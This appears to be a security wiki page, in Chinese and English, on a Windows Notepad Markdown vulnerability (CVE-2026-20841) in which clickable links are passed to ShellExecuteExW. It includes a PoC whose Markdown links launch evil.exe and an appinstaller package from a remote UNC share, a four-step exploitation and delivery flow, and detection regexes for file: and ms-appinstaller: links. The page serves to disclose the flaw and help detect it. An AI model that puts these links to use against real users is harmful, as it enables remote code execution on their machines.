# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

现代 Windows 应用程序在渲染 Markdown/HTML 时，通常会将用户提供的链接转换为可点击元素，并将其交给 `ShellExecuteExW`。如果没有严格的 scheme allowlist，任何已注册的 protocol handler（例如 `file:`、`ms-appinstaller:`）都可能被触发，进而在当前用户上下文中导致代码执行。<sup>[[1]](#references)</sup>

## Windows Notepad Markdown mode 中的 ShellExecuteExW attack surface
- Notepad 仅通过 `sub_1400ED5D0()` 中的固定字符串比较，为 **`.md` 扩展名**选择 Markdown mode。<sup>[[1]](#references)</sup>
- 支持的 Markdown links：
- Standard：`[text](target)`
- Autolink：`<target>`（渲染为 `[target](target)`），因此两种 syntax 都需要纳入 Payload 和 detection。
- Link clicks 在 `sub_140170F60()` 中处理，该函数执行 weak filtering，然后调用 `ShellExecuteExW`。
- `ShellExecuteExW` 会分派到**任何已配置的 protocol handler**，而不仅仅是 HTTP(S)。<sup>[[1]](#references)</sup>

### Payload 注意事项
- Link 中的任何 `\\` sequence 都会在调用 `ShellExecuteExW` **之前被规范化为 `\`**，从而影响 UNC/path crafting 和 detection。
- `.md` files **默认不会与 Notepad 关联**；victim 仍必须在 Notepad 中打开该 file 并点击 link，但渲染后该 link 可点击。
- 危险的 example schemes：<sup>[[1]](#references)</sup>
- `file://` 用于启动 local/UNC Payload。
- `ms-appinstaller://` 用于触发 App Installer flows。其他在本地注册的 schemes 也可能被 abuse。

### 最小 PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **normalized link** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- Monitor transfers of `.md` files over ports/protocols that commonly deliver documents: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parse Markdown links (standard and autolink) and look for **case-insensitive** `file:` or `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- 据报道，补丁行为 **allowlists 本地文件和 HTTP(S)**；任何其他到达 `ShellExecuteExW` 的内容都可疑。请根据需要将检测范围扩展到其他已安装的 protocol handlers，因为攻击面因系统而异。<sup>[[1]](#references)</sup>

## 参考资料
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
